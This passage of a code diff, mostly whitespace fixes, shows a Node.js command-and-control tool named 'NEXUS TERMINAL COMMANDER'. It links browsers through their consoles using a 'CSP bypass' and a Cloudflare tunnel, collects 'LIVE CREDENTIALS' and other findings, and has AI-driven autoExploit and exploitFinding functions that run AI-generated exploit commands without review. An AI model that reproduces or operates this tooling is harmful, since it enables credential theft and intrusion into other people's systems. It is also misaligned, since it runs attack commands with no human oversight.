         await OutputManager._delay(2000);
         OutputManager.stopSpinner('AI engine ready!', 'green');
         await OutputManager._delay(300);
-        
+
         // Progress bar demo
         console.log();
         for (let i = 0; i <= 10; i++) {
@@ -10580,12 +10673,12 @@ Respond in JSON only:
             await OutputManager._delay(150);
         }
         await OutputManager._delay(300);
-        
+
         // Final message
         await OutputManager.typeWriter('  ✓ All systems operational!', 20, 'green');
         console.log(`\n${C.dim}Demo complete. Use 'spinner <msg>' to show spinner.${C.reset}\n`);
     },
-    
+
     showHelp() {
         logBox('🔥 NEXUS TERMINAL COMMANDER v5.0 - COMMANDS', [
             '',
@@ -10728,12 +10821,12 @@ Respond in JSON only:
             ''
         ]);
     },
-    
+
     showStatus() {
         const summary = DataStore.getSummary();
         const uptime = process.uptime();
-        const uptimeStr = uptime > 3600 ? `${Math.floor(uptime/3600)}h ${Math.floor((uptime%3600)/60)}m` : `${Math.floor(uptime/60)}m ${Math.floor(uptime%60)}s`;
-        
+        const uptimeStr = uptime > 3600 ? `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m` : `${Math.floor(uptime / 60)}m ${Math.floor(uptime % 60)}s`;
+
         logBox('🔥 NEXUS STATUS', [
             `Version: ${CONFIG.VERSION}`,
             `Uptime: ${uptimeStr}`,
@@ -10754,36 +10847,36 @@ Respond in JSON only:
             `Last Sync: ${TerminalAI.browserAIContext?.lastScan || 'never'}`
         ]);
     },
-    
+
     showFindings() {
         const findings = DataStore.data.findings;
         if (findings.length === 0) {
             log('No findings yet. Connect browser and run scan.', 'yellow');
             return;
         }
-        
+
         console.log(`\n${C.bold}FINDINGS (${findings.length}):${C.reset}\n`);
         findings.slice(-20).forEach((f, i) => {
             console.log(`${C.cyan}[${i}]${C.reset} ${f.type || f.patternName}: ${(f.value || '').substring(0, 50)}...`);
         });
         console.log();
     },
-    
+
     showResults() {
         const results = DataStore.data.exploitResults;
         if (results.length === 0) {
             log('No exploit results yet. Run aiAgent() in browser or deep command.', 'yellow');
             return;
         }
-        
+
         // Separate successful and failed
         const successful = results.filter(r => r.success);
         const failed = results.filter(r => !r.success);
-        
+
         console.log(`\n${C.bold}${C.green}═══════════════════════════════════════════════════════════════${C.reset}`);
         console.log(`${C.bold}${C.green}   🎯 VERIFIED CREDENTIALS & EXPLOIT RESULTS${C.reset}`);
         console.log(`${C.bold}${C.green}═══════════════════════════════════════════════════════════════${C.reset}\n`);
-        
+
         if (successful.length > 0) {
             console.log(`${C.red}${C.bold}🔴 LIVE CREDENTIALS (${successful.length}):${C.reset}\n`);
             successful.forEach((r, i) => {
@@ -10791,7 +10884,7 @@ Respond in JSON only:
                 console.log(`${C.cyan}    Service: ${r.service || 'unknown'}${C.reset}`);
                 console.log(`${C.white}    Value: ${(r.value || '').substring(0, 50)}...${C.reset}`);
                 console.log(`${C.yellow}    Source: ${r.source || 'unknown'}${C.reset}`);
-                
+
                 if (r.analysis) {
                     console.log(`${C.magenta}    Access Level: ${r.analysis.accessLevel || 'N/A'}${C.reset}`);
                     if (r.analysis.permissions?.length > 0) {
@@ -10802,30 +10895,30 @@ Respond in JSON only:
                     }
                     console.log(`${C.green}    Bounty Est: ${r.analysis.bountyEstimate || 'N/A'}${C.reset}`);
                 }
-                
+
                 if (r.commands?.length > 0) {
                     console.log(`${C.dim}    Commands Tested: ${r.commands.length}${C.reset}`);
                 }
                 console.log();
             });
         }
-        
+
         if (failed.length > 0) {
             console.log(`${C.dim}⚪ Failed/Invalid (${failed.length}):${C.reset}`);
             failed.slice(-5).forEach((r, i) => {
                 console.log(`${C.dim}   [${i}] ${r.command?.substring(0, 60) || r.type || 'unknown'}...${C.reset}`);
             });
         }
-        
+
         console.log(`\n${C.bold}Total: ${results.length} | Live: ${successful.length} | Failed: ${failed.length}${C.reset}\n`);
     },
-    
+
     showBrowsers() {
         if (connectedBrowsers.size === 0) {
             log('No browsers connected.', 'yellow');
             return;
         }
-        
+
         console.log(`\n${C.bold}CONNECTED BROWSERS (${connectedBrowsers.size}):${C.reset}\n`);
         connectedBrowsers.forEach((client, id) => {
             console.log(`${C.green}●${C.reset} ${id} - ${client.ip} (${client.tabs.length} tabs)`);
@@ -10835,60 +10928,60 @@ Respond in JSON only:
         });
         console.log();
     },
-    
+
     exportData(filename) {
         try {
             fs.writeFileSync(filename, JSON.stringify(DataStore.data, null, 2));
             log(`Data exported to ${filename}`, 'green');
-        } catch(e) {
+        } catch (e) {
             log(`Export failed: ${e.message}`, 'red');
         }
     },
-    
+
     async exploitFinding(index) {
         const findings = DataStore.data.findings;
         if (index < 0 || index >= findings.length) {
             log(`Invalid index. Range: 0-${findings.length - 1}`, 'red');
             return;
         }
-        
+
         const finding = findings[index];
         log(`Exploiting: ${finding.type || finding.patternName}`, 'yellow');
-        
+
         if (TerminalAI.config.isActive) {
             const analysis = await TerminalAI.analyzeVulnerability(finding, DataStore.data.browserData);
-            
+
             try {
                 const json = JSON.parse(analysis.match(/\{[\s\S]*\}/)?.[0] || '{}');
-                
+
                 if (json.exploitCommands && json.exploitCommands.length > 0) {
                     log('Executing AI-generated commands...', 'magenta');
-                    
+
                     for (const cmd of json.exploitCommands) {
                         await CommandExecutor.execute(cmd);
                     }
                 }
-            } catch(e) {
+            } catch (e) {
                 console.log(analysis);
             }
         }
     },
-    
+
     async autoExploit() {
         const findings = DataStore.data.findings;
         if (findings.length === 0) {
             log('No findings to exploit.', 'yellow');
             return;
         }
-        
+
         log(`Auto-exploiting ${findings.length} findings...`, 'yellow');
-        
+
         if (TerminalAI.config.isActive) {
             const plan = await TerminalAI.generateExploitPlan(findings, DataStore.data.browserData);
-            
+
             try {
                 const json = JSON.parse(plan.match(/\{[\s\S]*\}/)?.[0] || '{}');
-                
+
                 if (json.exploitationSteps) {
                     for (const step of json.exploitationSteps) {
                         log(`Step ${step.step}: ${step.target}`, 'blue');
@@ -10897,7 +10990,7 @@ Respond in JSON only:
                         }
                     }
                 }
-            } catch(e) {
+            } catch (e) {
                 console.log(plan);
             }
         }
@@ -10958,7 +11051,7 @@ function readBody(req) {
         let body = '';
         req.on('data', chunk => { body += chunk; if (body.length > 1e6) req.destroy(); });
         req.on('end', () => {
-            try { resolve(JSON.parse(body)); } catch(e) { resolve({}); }
+            try { resolve(JSON.parse(body)); } catch (e) { resolve({}); }
         });
         req.on('error', reject);
     });
@@ -10976,7 +11069,7 @@ function httpQueueMessage(sessionId, message) {
 async function handleHTTPBrowserMessage(sessionId, message) {
     const session = httpSessions.get(sessionId);
     if (!session || !session.authenticated) return;
-    
+
     // Create a fake ws-like object that queues messages instead of sending via WS
     const fakeWS = {
         readyState: 1, // WebSocket.OPEN
@@ -10984,29 +11077,29 @@ async function handleHTTPBrowserMessage(sessionId, message) {
             try {
                 const parsed = JSON.parse(data);
                 httpQueueMessage(sessionId, parsed);
-            } catch(e) {
+            } catch (e) {
                 httpQueueMessage(sessionId, { raw: data });
             }
         }
     };
-    
+
     // Reuse the existing WS message handler
     await handleBrowserMessage(session.clientId, message, fakeWS);
 }
 
 const httpServer = http.createServer(async (req, res) => {
     setCORSHeaders(res);
-    
+
     // Handle CORS preflight
     if (req.method === 'OPTIONS') {
         res.writeHead(204);
         res.end();
         return;
     }
-    
+
     const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
     const pathname = url.pathname;
-    
+
     // ═══ HTTP BRIDGE: AUTH ═══
     if (pathname === '/bridge/auth' && req.method === 'POST') {
         try {
@@ -11014,7 +11107,7 @@ const httpServer = http.createServer(async (req, res) => {
             if (body.token === CONFIG.AUTH_TOKEN) {
                 const sessionId = generateToken() + generateToken();
                 const clientId = generateToken().substring(0, 8);
-                
+
                 // Register the HTTP session
                 httpSessions.set(sessionId, {
                     authenticated: true,
@@ -11024,14 +11117,14 @@ const httpServer = http.createServer(async (req, res) => {
                     ip: req.socket.remoteAddress,
                     connectedAt: new Date().toISOString()
                 });
-                
+
                 // Also register in connectedBrowsers so terminal CLI sees it
                 const fakeWS = {
                     readyState: 1,
                     send(data) {
                         try {
                             httpQueueMessage(sessionId, JSON.parse(data));
-                        } catch(e) {}
+                        } catch (e) { }
                     }
                 };
                 connectedBrowsers.set(clientId, {
@@ -11043,14 +11136,14 @@ const httpServer = http.createServer(async (req, res) => {
                     isHTTPBridge: true,
                     sessionId: sessionId
                 });
-                
+
                 logBox('🌐 HTTP BRIDGE AUTH', [
                     `Client: ${clientId}`,
                     `Session: ${sessionId.substring(0, 12)}...`,
                     `IP: ${req.socket.remoteAddress}`,
                     `Mode: HTTP Polling (CSP Bypass)`
                 ], 'green');
-                
+
                 // Queue welcome + auth_success
                 httpQueueMessage(sessionId, {
                     type: 'welcome',
@@ -11069,7 +11162,7 @@ const httpServer = http.createServer(async (req, res) => {
                     autoSync: CONFIG.AUTO_SYNC,
                     capabilities: ['execute', 'ai_query', 'ai_collaboration', 'auto_sync', 'exploit']
                 });
-                
+
                 // Auto-sync like WS does
                 if (CONFIG.AUTO_SYNC) {
                     setTimeout(() => {
@@ -11079,68 +11172,68 @@ const httpServer = http.createServer(async (req, res) => {
                         httpQueueMessage(sessionId, { type: 'terminal_command', command: 'get_all_data', data: {}, timestamp: Date.now() });
                     }, 3000);
                 }
-                
+
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ success: true, sessionId, clientId }));
             } else {
                 res.writeHead(401, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ success: false, error: 'Invalid token' }));
             }
-        } catch(e) {
+        } catch (e) {
             res.writeHead(500, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ success: false, error: e.message }));
         }
         return;
     }
-    
+
     // ═══ HTTP BRIDGE: POLL (browser picks up queued messages) ═══
     if (pathname === '/bridge/poll' && req.method === 'GET') {
         const sessionId = req.headers['x-session-id'] || url.searchParams.get('sid');
         const session = httpSessions.get(sessionId);
-        
+
         if (!session || !session.authenticated) {
             res.writeHead(401, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ error: 'Invalid session' }));
             return;
         }
-        
+
         session.lastPoll = Date.now();
-        
+
         // Drain the message queue
         const messages = session.messageQueue.splice(0);
-        
+
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ messages }));
         return;
     }
-    
+
     // ═══ HTTP BRIDGE: SEND (browser sends command to server) ═══
     if (pathname === '/bridge/send' && req.method === 'POST') {
         const sessionId = req.headers['x-session-id'] || '';
         const session = httpSessions.get(sessionId);
-        
+
         if (!session || !session.authenticated) {
             res.writeHead(401, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ error: 'Invalid session' }));
             return;
         }
-        
+
         session.lastPoll = Date.now();
-        
+
         try {
             const body = await readBody(req);
             // Process via the same handler as WebSocket messages
             await handleHTTPBrowserMessage(sessionId, body);
-            
+
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ success: true }));
-        } catch(e) {
+        } catch (e) {
             res.writeHead(500, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ success: false, error: e.message }));
         }
         return;
     }
-    
+
     // ═══ HTTP BRIDGE: DISCONNECT ═══
     if (pathname === '/bridge/disconnect' && req.method === 'POST') {
         const sessionId = req.headers['x-session-id'] || '';
@@ -11154,7 +11247,7 @@ const httpServer = http.createServer(async (req, res) => {
         res.end(JSON.stringify({ success: true }));
         return;
     }
-    
+
     // ═══ ORIGINAL ROUTES ═══
     if (pathname === '/health') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -11219,7 +11312,7 @@ const httpServer = http.createServer(async (req, res) => {
 // Display connection instructions for browser console
 function displayConnectionInstructions(ip, port, token, cloudflareUrl = null) {
     const wssUrl = cloudflareUrl ? cloudflareUrl.replace('https://', 'wss://') : null;
-    
+
     console.log(`
 ${C.red}${C.bold}================================================================================
 🔥 BROWSER CONSOLE CONNECTION INSTRUCTIONS (CSP BYPASS v7.0):
@@ -11252,24 +11345,24 @@ ${C.red}${C.bold}===============================================================
 
 async function startup() {
     console.clear();
-    
+
     console.log(`
 \x1b[35m\x1b[1m
 ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 ║                              🔧 NEXUS AUTO-HEALER INITIALIZING...                                                ║
 ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 \x1b[0m`);
-    
+
     // ═══════════════════════════════════════════════════════════════════════════
     // STEP 1: Check and install dependencies (ws module)
     // ═══════════════════════════════════════════════════════════════════════════
     await AutoHealer.checkDependencies();
-    
+
     // ═══════════════════════════════════════════════════════════════════════════
     // STEP 2: Resolve port conflicts automatically
     // ═══════════════════════════════════════════════════════════════════════════
     CONFIG.PORT = await AutoHealer.resolvePortConflict(CONFIG.PORT);
-    
+
     // ═══════════════════════════════════════════════════════════════════════════
     // STEP 3: Ensure cloudflared is available (download if needed)
     // ═══════════════════════════════════════════════════════════════════════════
@@ -11280,14 +11373,14 @@ async function startup() {
             CONFIG.USE_CLOUDFLARE = false;
         }
     }
-    
+
     console.log(`
 \x1b[32m\x1b[1m
 ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 ║                              ✓ AUTO-HEALER COMPLETE - SYSTEM READY                                               ║
 ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 \x1b[0m`);
-    
+
     const localIP = getLocalIP();
     console.log(`
 ${C.magenta}${C.bold}
@@ -11306,7 +11399,7 @@ ${C.magenta}${C.bold}
 ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 ${C.reset}
 `);
-    
+
     // Show API key tip if AI is not configured
     if (!TerminalAI.config.isActive) {
         console.log(`${C.yellow}${C.bold}
@@ -11322,41 +11415,41 @@ ${C.reset}
 ${C.reset}
 `);
     }
-    
+
     // Load saved data
     DataStore.load();
-    
+
     // Load AI Memory (persistent learning)
     AIMemory.load();
-    
+
     // Load API Key Pool (bulk rate limit protection)
     TerminalAI.loadKeyPool();
-    
+
     // Initialize AI if key provided
     if (CONFIG.AI_KEY) {
         TerminalAI.init(CONFIG.AI_KEY, CONFIG.AI_PROVIDER);
     }
-    
+
     // Create HTTP server fresh for the resolved port
     const server = http.createServer((req, res) => {
         // Same request handler as before
         res.setHeader('Access-Control-Allow-Origin', '*');
         res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
         res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-        
+
         if (req.method === 'OPTIONS') {
             res.writeHead(200);
             res.end();
             return;
         }
-        
+
         // Handle HTTP polling bridge for CSP-restricted environments
         if (req.url === '/poll' && req.method === 'GET') {
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ status: 'ok', queue: [] }));
             return;
         }
-        
+
         if (req.url === '/send' && req.method === 'POST') {
             let body = '';
             req.on('data', chunk => body += chunk);
@@ -11373,26 +11466,26 @@ ${C.reset}
             });
             return;
         }
-        
+
         // Health check
         if (req.url === '/health') {
             res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({ 
-                status: 'healthy', 
+            res.end(JSON.stringify({
+                status: 'healthy',
                 version: CONFIG.VERSION,
                 port: CONFIG.PORT,
-                cloudflare: CONFIG.CLOUDFLARE_URL || null 
+                cloudflare: CONFIG.CLOUDFLARE_URL || null
             }));
             return;
         }
-        
+
         res.writeHead(404);
         res.end('Not Found');
     });
-    
+
     // Start WebSocket server
     createWebSocketServer(server);
-    
+
     // Start HTTP server with error handling
     server.on('error', async (err) => {
         if (err.code === 'EADDRINUSE') {
@@ -11404,20 +11497,20 @@ ${C.reset}
             console.error('\x1b[31m[Error] Server error:', err.message, '\x1b[0m');
         }
     });
-    
+
     server.listen(CONFIG.PORT, '0.0.0.0', async () => {
         log(`Server listening on port ${CONFIG.PORT}`, 'green');
         log(`Local IP: ${localIP}`, 'blue');
-        
+
         // Start Cloudflare Tunnel (auto CSP bypass)
         let cloudflareUrl = null;
         if (CONFIG.USE_CLOUDFLARE && CONFIG.CLOUDFLARED_PATH) {
             cloudflareUrl = await CloudflareTunnel.start(CONFIG.PORT, CONFIG.CLOUDFLARED_PATH);
         }
-        
+
         // Generate and display connection instructions
         displayConnectionInstructions(localIP, CONFIG.PORT, CONFIG.AUTH_TOKEN, cloudflareUrl);
-        
+
         // Start CLI
         CLI.start();
     });
@@ -11437,7 +11530,7 @@ process.on('uncaughtException', (error) => {
     log(`Uncaught exception: ${error.message}`, 'red');
     console.error(error);
     // Try to save memory on crash
-    try { AIMemory.save(); } catch(e) {}
+    try { AIMemory.save(); } catch (e) { }
 });
 
 // Start
